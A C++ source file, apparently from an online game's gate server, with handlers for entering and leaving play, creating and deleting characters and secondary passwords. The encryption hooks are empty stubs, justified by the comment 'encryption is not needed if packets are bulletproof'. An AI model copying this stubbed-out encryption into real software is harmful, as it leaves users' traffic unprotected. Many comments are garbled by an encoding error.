		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr);
		l_ply->gp_addr = 0;
		l_retpk		   = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk, l_ulMilliseconds);
	  }
	} catch(...)
	{
	  LogLine l_line(g_gatelog);
	  l_line << newln << "Error exit!";
	}
	l_lockStat.unlock();
	l_ply->Free();
  }
  return l_retpk;
}

void ToClient::CM_BGNPLAY(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);

	  if(l_ply->m_status != 1 || !l_ply->gp_addr) //�����������ʱ���Ƿ�����Ϊ��ǰ��Ҳ�����ѡ��ɫ״̬������ѡ������һ����ɫ
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_BGNPLAY);
		l_wpk.WriteShort(ERR_MC_NOTSELCHA);
		SendData(datasock, l_wpk);
		return;
	  }

	  WPacket l_wpk = WPacket(recvbuf).Duplicate();
	  l_wpk.WriteCmd(CMD_TP_BGNPLAY);
	  l_wpk.WriteLongLong(MakeULong(l_ply));
	  l_wpk.WriteLongLong(l_ply->gp_addr);
	  RPacket l_rpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk, l_ulMilliseconds);
	  uShort  l_errno;
	  if(!l_rpk.HasData()) //�������
	  {
		l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_BGNPLAY);
		l_wpk.WriteShort(ERR_MC_NETEXCP);
		SendData(datasock, l_wpk);
	  } else if(l_errno = l_rpk.ReadShort()) //�����ɫ���Ϸ�
	  {
		l_wpk = l_rpk;
		l_wpk.WriteCmd(CMD_MC_BGNPLAY);
		SendData(datasock, l_wpk);
		if(l_errno == ERR_PT_KICKUSER)
		{
		  Disconnect(datasock, 100, -25);
		}
	  } else //ѡ���ɫ�ɹ������سɹ���Ϣ�����Ұѵ�ͼ���ͳɹ��Ľ�ɫID����GameServer��
	  {
		// Modify by lark.li 20080317
		memset(l_ply->m_password, 0, sizeof(l_ply->m_password));
		//strncpy( l_ply->m_password, l_rpk.ReadString(), ROLE_MAXSIZE_PASSWORD2 );	//��ɫ��������
		strncpy_s(l_ply->m_password, sizeof(l_ply->m_password), l_rpk.ReadString(), _TRUNCATE); //��ɫ��������
		// End

		l_ply->m_dbid		  = l_rpk.ReadLong(); //��ɫID;
		l_ply->m_worldid	  = l_rpk.ReadLong(); //GroupServer�����ΨһID
		cChar* l_map		  = l_rpk.ReadString();
		l_ply->m_sGarnerWiner = l_rpk.ReadShort();
		GameServer* l_game	  = g_gtsvr->gm_conn->find(l_map);
		if(!l_game) //Ŀ���ͼ���ɴ�
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_BGNPLAY);
		  l_wpk.WriteShort(ERR_MC_NOTARRIVE);
		  SendData(datasock, l_wpk);
		} else if(l_game->m_plynum > 15000) //��������
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_BGNPLAY);
		  l_wpk.WriteShort(ERR_MC_TOOMANYPLY);
		  SendData(datasock, l_wpk);
		} else
		{
		  l_ply->m_status = 2; //ѡ���ɫ�ɹ�����������Ϸ״̬
		  l_game->m_plynum++;  //����ͬ����ֻ�Ǽ򵥲ο�
		  //֪ͨGameServer�����ͼ

		  LogLine l_line(g_gatelog);
		  l_line << newln << "client: " << datasock->GetPeerIP() << ":" << datasock->GetPeerPort() << "	BeginPlay entry map,Gate to["
				 << l_game->m_datasock->GetPeerIP() << "]send EnterMap command,dbid:" << l_ply->m_dbid
				 << uppercase << hex << ",Gate address:" << MakeULong(l_ply) << dec << nouppercase << endln;

		  l_game->EnterMap(l_ply, l_ply->m_loginID, l_ply->m_dbid, l_ply->m_worldid, l_map, -1, 0, 0, 0, l_ply->m_sGarnerWiner); //���ݵ�ͼ����GameServer��Ȼ������GameServer�Խ��������ͼ��
		}
	  }
	  l_lockStat.unlock();
	}
  } else
  {
	WPacket l_wpk = datasock->GetWPacket();
	l_wpk.WriteCmd(CMD_MC_BGNPLAY);
	l_wpk.WriteShort(ERR_MC_NETEXCP);
	SendData(datasock, l_wpk);
  }
}

void ToClient::CM_ENDPLAY(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  l_ulMilliseconds		 = (l_ulMilliseconds > l_tick) ? l_ulMilliseconds - l_tick : 1;

  Player* l_ply = (Player*)datasock->GetPointer();
  if(l_ply)
  {
	MutexArmor l_lockStat(l_ply->m_mtxstat);

	if(l_ply->m_status != 2 || !l_ply->gm_addr) //�����������ʱ���Ƿ�����Ϊ��ǰ��Ҳ�����һ����ɫ�У���������ѡ������һ����ɫ
	{
	  WPacket l_wpk = datasock->GetWPacket();
	  l_wpk.WriteCmd(CMD_MC_ENDPLAY);
	  l_wpk.WriteShort(ERR_MC_NOTPLAY);
	  SendData(datasock, l_wpk);
	  Disconnect(datasock, 100, -25);
	} else
	{
	  GameServer* l_game = l_ply->game;
	  if(l_game && l_game->m_datasock)
	  {
		l_ply->m_status = 1; //����ѡ��ɫ����״̬

		l_game->m_plynum--;
		//֪ͨGameServer����ͼ
		LogLine l_line(g_gatelog);
		//l_line<<newln<<"�ͻ���: "<<datasock->GetPeerIP()<<":"<<datasock->GetPeerPort()<<"	GoOut����ͼ,Gate��["
		l_line << newln << "client: " << datasock->GetPeerIP() << ":" << datasock->GetPeerPort() << "	GoOut map,Gate to["
			   //<<l_game->m_datasock->GetPeerIP()<<"]������GoOutMap����,dbid:"<<l_ply->m_dbid
			   << l_game->m_datasock->GetPeerIP() << "] send GoOutMap command,dbid:" << l_ply->m_dbid
			   //<<uppercase<<hex<<",����Gate��ַ:"<<MakeULong(l_ply)<<",Game��ַ:"<<l_ply->gm_addr<<dec<<nouppercase<<endln;
			   << uppercase << hex << ",Gate address:" << MakeULong(l_ply) << ",Game address:" << l_ply->gm_addr << dec << nouppercase << endln;
		WPacket l_wpk = WPacket(recvbuf).Duplicate();
		l_wpk.WriteCmd(CMD_TM_GOOUTMAP);

		l_wpk.WriteChar(0);

		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gm_addr); //����GameServer�ϵĵ�ַ

		l_ply->game	   = 0; //��ֹ����ĵ�GameServer������
		l_ply->gm_addr = 0; //��ֹ����ĵ�GameServer������

		g_gtsvr->gm_conn->SendData(l_game->m_datasock, l_wpk);
		//g_gtsvr->gm_conn->SyncCall(l_game->m_datasock,l_wpk);
		//֪ͨGroupServer��������Ϸ

		l_wpk = WPacket(recvbuf).Duplicate();
		l_wpk.WriteCmd(CMD_TP_ENDPLAY);
		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr);
		l_wpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk, l_ulMilliseconds);
		if(!l_wpk.HasData())
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_ENDPLAY);
		  l_wpk.WriteShort(ERR_MC_NETEXCP);
		  SendData(datasock, l_wpk);
		  Disconnect(datasock, 100, -25);
		} else
		{
		  uShort err = RPacket(l_wpk).ReadShort();
		  if(err == ERR_PT_INERR || err == ERR_PT_KICKUSER)
		  {
			Disconnect(datasock, 100, -25);
		  } else
		  {
			//���ظ�Client
			l_wpk.WriteCmd(CMD_MC_ENDPLAY);
			SendData(datasock, l_wpk);
			l_ply->m_dbid	 = 0;
			l_ply->m_worldid = 0;
		  }

		  ////���ظ�Client
		  //l_wpk.WriteCmd(CMD_MC_ENDPLAY);
		  //SendData(datasock,l_wpk);
		  //l_ply->m_dbid	=0;
		  //l_ply->m_worldid=0;
		  //if(RPacket(l_wpk).ReadShort() ==ERR_PT_KICKUSER)
		  //{
		  //	Disconnect(datasock,100,-25);
		  //}
		}
	  }
	}
	l_lockStat.unlock();
  }
}

void ToClient::CM_NEWCHA(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);
	  if(l_ply->m_status != 1 || !l_ply->gp_addr)
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_NEWCHA);
		l_wpk.WriteShort(ERR_MC_NOTSELCHA);
		SendData(datasock, l_wpk);
	  } else
	  {
		//����GroupServer
		WPacket l_wpk = WPacket(recvbuf).Duplicate();
		l_wpk.WriteCmd(CMD_TP_NEWCHA);
		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr); //������ַ
		l_wpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk, l_ulMilliseconds);
		if(!l_wpk.HasData())
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_NEWCHA);
		  l_wpk.WriteShort(ERR_MC_NETEXCP);
		  SendData(datasock, l_wpk);
		  Disconnect(datasock, 100, -25);
		} else
		{
		  //����Client
		  l_wpk.WriteCmd(CMD_MC_NEWCHA);
		  SendData(datasock, l_wpk);
		  if(RPacket(l_wpk).ReadShort() == ERR_PT_KICKUSER)
		  {
			Disconnect(datasock, 100, -25);
		  }
		}
	  }
	  l_lockStat.unlock();
	}
  } else
  {
	WPacket l_wpk = datasock->GetWPacket();
	l_wpk.WriteCmd(CMD_MC_NEWCHA);
	l_wpk.WriteShort(ERR_MC_NETEXCP);
	SendData(datasock, l_wpk);
	Disconnect(datasock, 100, -25);
  }
}
void ToClient::CM_DELCHA(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);
	  if(l_ply->m_status != 1 || !l_ply->gp_addr)
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_DELCHA);
		l_wpk.WriteShort(ERR_MC_NOTSELCHA);
		SendData(datasock, l_wpk);
	  } else
	  {
		//����GroupServer
		dbc::uShort cha_name_len;
		const auto cha_name = recvbuf.ReadSequence(cha_name_len);
		const auto password = ReadPacketSequenceEncrypted(recvbuf, l_ply->m_AESKey);

		auto l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_TP_DELCHA);
		l_wpk.WriteSequence(cha_name, cha_name_len);
		l_wpk.WriteSequence((cChar*)password.data(), password.size());
		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr); //������ַ
		l_wpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk);
		if(!l_wpk.HasData())
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_DELCHA);
		  l_wpk.WriteShort(ERR_MC_NETEXCP);
		  SendData(datasock, l_wpk);
		  Disconnect(datasock, 100, -25);
		} else
		{
		  //����Client
		  l_wpk.WriteCmd(CMD_MC_DELCHA);
		  SendData(datasock, l_wpk);
		  if(RPacket(l_wpk).ReadShort() == ERR_PT_KICKUSER)
		  {
			Disconnect(datasock, 100, -25);
		  }
		}
	  }
	  l_lockStat.unlock();
	}
  } else
  {
	WPacket l_wpk = datasock->GetWPacket();
	l_wpk.WriteCmd(CMD_MC_DELCHA);
	l_wpk.WriteShort(ERR_MC_NETEXCP);
	SendData(datasock, l_wpk);
	Disconnect(datasock, 100, -25);
  }
}

void ToClient::CM_CREATE_PASSWORD2(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);
	  if(l_ply->m_status != 1 || !l_ply->gp_addr)
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_DELCHA);
		l_wpk.WriteShort(ERR_MC_NOTSELCHA);
		SendData(datasock, l_wpk);
	  } else
	  {
		//����GroupServer
		auto password = ReadPacketSequenceEncrypted(recvbuf, l_ply->m_AESKey);
		auto	   l_wpk	= datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_TP_CREATE_PASSWORD2);
		l_wpk.WriteSequence((cChar*)password.data(), password.size());
		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr); //������ַ
		l_wpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk);
		if(!l_wpk.HasData())
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_CREATE_PASSWORD2);
		  l_wpk.WriteShort(ERR_MC_NETEXCP);
		  SendData(datasock, l_wpk);
		  Disconnect(datasock, 100, -25);
		} else
		{
		  //����Client
		  l_wpk.WriteCmd(CMD_MC_CREATE_PASSWORD2);
		  SendData(datasock, l_wpk);
		  if(RPacket(l_wpk).ReadShort() == ERR_PT_KICKUSER)
		  {
			Disconnect(datasock, 100, -25);
		  }
		}
	  }
	  l_lockStat.unlock();
	}
  } else
  {
	WPacket l_wpk = datasock->GetWPacket();
	l_wpk.WriteCmd(CMD_MC_CREATE_PASSWORD2);
	l_wpk.WriteShort(ERR_MC_NETEXCP);
	SendData(datasock, l_wpk);
	Disconnect(datasock, 100, -25);
  }
}

void ToClient::CM_UPDATE_PASSWORD2(DataSocket* datasock, RPacket& recvbuf)
{
  uLong l_ulMilliseconds = 30 * 1000;
  uLong l_tick			 = GetTickCount() - recvbuf.GetTickCount();
  if(l_ulMilliseconds > l_tick)
  {
	l_ulMilliseconds = l_ulMilliseconds - l_tick;

	Player* l_ply = (Player*)datasock->GetPointer();
	if(l_ply)
	{
	  MutexArmor l_lockStat(l_ply->m_mtxstat);
	  if(l_ply->m_status != 1 || !l_ply->gp_addr)
	  {
		WPacket l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_MC_DELCHA);
		l_wpk.WriteShort(ERR_MC_NOTSELCHA);
		SendData(datasock, l_wpk);
	  } else
	  {
		//����GroupServer

		const auto old_password = ReadPacketSequenceEncrypted(recvbuf, l_ply->m_AESKey);
		const auto new_password = ReadPacketSequenceEncrypted(recvbuf, l_ply->m_AESKey);
		auto l_wpk = datasock->GetWPacket();
		l_wpk.WriteCmd(CMD_TP_UPDATE_PASSWORD2);
		l_wpk.WriteSequence((cChar*)old_password.data(), old_password.size());
		l_wpk.WriteSequence((cChar*)new_password.data(), new_password.size());
		l_wpk.WriteLongLong(MakeULong(l_ply));
		l_wpk.WriteLongLong(l_ply->gp_addr); //������ַ
		l_wpk = g_gtsvr->gp_conn->SyncCall(g_gtsvr->gp_conn->get_datasock(), l_wpk);
		if(!l_wpk.HasData())
		{
		  l_wpk = datasock->GetWPacket();
		  l_wpk.WriteCmd(CMD_MC_UPDATE_PASSWORD2);
		  l_wpk.WriteShort(ERR_MC_NETEXCP);
		  SendData(datasock, l_wpk);
		  Disconnect(datasock, 100, -25);
		} else
		{
		  //����Client
		  l_wpk.WriteCmd(CMD_MC_UPDATE_PASSWORD2);
		  SendData(datasock, l_wpk);
		  if(RPacket(l_wpk).ReadShort() == ERR_PT_KICKUSER)
		  {
			Disconnect(datasock, 100, -25);
		  }
		}
	  }
	  l_lockStat.unlock();
	}
  } else
  {
	WPacket l_wpk = datasock->GetWPacket();
	l_wpk.WriteCmd(CMD_MC_UPDATE_PASSWORD2);
	l_wpk.WriteShort(ERR_MC_NETEXCP);
	SendData(datasock, l_wpk);
	Disconnect(datasock, 100, -25);
  }
}

void ToClient::OnEncrypt(DataSocket* datasock, char* ciphertext, const char* text, uLong& len)
{
  TcpCommApp::OnEncrypt(datasock, ciphertext, text, len);

  if(_comm_enc > 0)
  { 
	Player* ply = (Player*)datasock->GetPointer();

	if(ply && ply->enc)
	{
	  try
	  {
		// @to-do: idk, encryption is not needed if packets are bulletproof.
	  } catch(...)
	  {
		LogLine l_line(g_gateerr);
		l_line << newln << "GameServer= [" << datasock->GetPeerIP() << "] ToClient::OnEncrypt Error!";
		l_line << endln;
	  }
	}
  }

  return;
}

void ToClient::OnDecrypt(DataSocket* datasock, char* ciphertext, uLong& len)
{
  TcpCommApp::OnDecrypt(datasock, ciphertext, len);

  if(_comm_enc > 0)
  {
	Player* ply = (Player*)datasock->GetPointer();
	if(ply && ply->enc)
	{
	  try
	  {
		// @to-do: idk, encryption is not needed if packets are bulletproof.
	  } catch(...)
	  {
		LogLine l_line(g_gateerr);
		l_line << newln << "GameServer= [" << datasock->GetPeerIP() << "] ToClient::OnDecrypt Error!";
		l_line << endln;
	  }
	}
  }
  return;
}

void ToClient::post_mapcrash_msg(Player* ply)
{
  if(ply->m_datasock == NULL) return;
  WPacket pk = ply->m_datasock->GetWPacket();
  pk.WriteCmd(CMD_MC_MAPCRASH);
  //pk.WriteString("��ͼ���������ϣ����Ժ�����...");
  pk.WriteString(RES_STRING(GS_TOCLIENT_CPP_00031));
  SendData(ply->m_datasock, pk);
}
